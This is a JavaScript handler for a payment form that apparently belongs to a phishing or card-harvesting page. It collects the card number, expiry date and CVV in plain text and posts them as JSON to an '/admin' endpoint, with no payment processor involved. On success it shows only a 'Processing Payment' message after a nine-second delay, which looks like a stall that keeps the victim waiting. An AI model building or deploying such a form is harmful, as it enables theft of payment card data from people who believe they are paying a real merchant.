document.getElementById("payment-form").addEventListener("submit", async function(event) {
    event.preventDefault(); // Prevent default form submission behavior

    // Get input values
    const cardNumber = document.getElementById("card-number").value.trim();
    const expiryDate = document.getElementById("mm/yy").value.trim();
    const cvv = document.getElementById("cvv").value.trim();

    // Validate fields (prevent empty submission)
    if (!cardNumber || !expiryDate || !cvv) {
        Swal.fire({
            icon: "warning",
            title: "Missing Fields",
            text: "Please fill in all fields before proceeding.",
            confirmButtonColor: "#3085d6",
            width: "400px",
            didOpen: () => {
                document.querySelector(".swal2-title").style.fontSize = "16px";
                document.querySelector(".swal2-title").style.lineHeight = "1.4";
                document.querySelector(".swal2-html-container").style.fontSize = "14px";
                document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
                document.querySelector(".swal2-confirm").style.fontSize = "13px";
                document.querySelector(".swal2-confirm").style.padding = "8px 16px";
            }
        });
        return; // Stop function execution if any field is empty
    }

    // Show spinner only if all fields are filled
    document.getElementById("spinner-container").style.display = "flex";

    // Prepare form data
    const formData = { cardNumber, expiryDate, cvv };

    try {
        const response = await fetch("/admin", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(formData)
        });

        const data = await response.json();

        // Wait for spinner animation (3 seconds), then hide it and show SweetAlert
        setTimeout(() => {
            document.getElementById("spinner-container").style.display = "none";

            if (response.ok) {
                Swal.fire({
                    icon: "info",
                    title: "Processing Payment ...",
                    text: "Please wait while we process your transaction.",
                    confirmButtonColor: "#3085d6",
                    width: "400px",
                    didOpen: () => {
                        document.querySelector(".swal2-title").style.fontSize = "16px";
                        document.querySelector(".swal2-title").style.lineHeight = "1.4";
                        document.querySelector(".swal2-html-container").style.fontSize = "14px";
                        document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
                        document.querySelector(".swal2-confirm").style.fontSize = "13px";
                        document.querySelector(".swal2-confirm").style.padding = "8px 16px";
                    }
                });
            } else {
                Swal.fire({
                    icon: "error",
                    title: "Payment Failed",
                    text: data.message,
                    confirmButtonColor: "#d33",
                    width: "400px",
                    didOpen: () => {
                        document.querySelector(".swal2-title").style.fontSize = "16px";
                        document.querySelector(".swal2-title").style.lineHeight = "1.4";
                        document.querySelector(".swal2-html-container").style.fontSize = "14px";
                        document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
                        document.querySelector(".swal2-confirm").style.fontSize = "13px";
                        document.querySelector(".swal2-confirm").style.padding = "8px 16px";
                    }
                });
            }
        }, 9000); 
        
    } catch (error) {
        console.error("Error:", error);
        setTimeout(() => {
            document.getElementById("spinner-container").style.display = "none";
            Swal.fire({
                icon: "error",
                title: "Oops!",
                text: "Something went wrong!",
                confirmButtonColor: "#d33",
                width: "400px",
                didOpen: () => {
                    document.querySelector(".swal2-title").style.fontSize = "16px";
                    document.querySelector(".swal2-title").style.lineHeight = "1.4";
                    document.querySelector(".swal2-html-container").style.fontSize = "14px";
                    document.querySelector(".swal2-html-container").style.lineHeight = "1.5";
                    document.querySelector(".swal2-confirm").style.fontSize = "13px";
                    document.querySelector(".swal2-confirm").style.padding = "8px 16px";
                }
            });
        }, 9000);
    }
});
